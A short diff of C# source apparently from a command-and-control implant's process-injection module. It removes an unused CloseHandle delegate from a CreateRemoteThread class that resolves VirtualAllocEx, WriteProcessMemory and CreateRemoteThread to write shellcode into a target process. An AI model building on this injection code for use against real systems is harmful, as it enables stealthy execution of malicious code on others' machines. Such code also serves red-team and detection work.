@@ -37,14 +37,11 @@ namespace Injection.Techniques
             IntPtr lpParameter,
             uint dwCreationFlags,
             IntPtr lpThreadId);
-        private delegate void CloseHandle(IntPtr handle);
-
 
         private VirtualAllocEx _pVirtualAllocEx;
         private WriteProcessMemory _pWriteProcessMemory;
         private CRT _pCreateRemoteThread;
         private VirtualProtectEx _pVirtualProtectEx;
-        private CloseHandle _pCloseHandle;
 
         public CreateRemoteThread(IAgent agent, byte[] code, int pid) : base(agent, code, pid)
         {
@@ -62,7 +59,6 @@ namespace Injection.Techniques
             _pWriteProcessMemory = _agent.GetApi().GetLibraryFunction<WriteProcessMemory>(Library.KERNEL32, "WriteProcessMemory");
             _pCreateRemoteThread = _agent.GetApi().GetLibraryFunction<CRT>(Library.KERNEL32, "CreateRemoteThread");
             _pVirtualProtectEx = _agent.GetApi().GetLibraryFunction<VirtualProtectEx>(Library.KERNEL32, "VirtualProtectEx");
-            _pCloseHandle = _agent.GetApi().GetLibraryFunction<CloseHandle>(Library.KERNEL32, "CloseHandle");
         }
 
         public override bool Inject(string arguments = "")
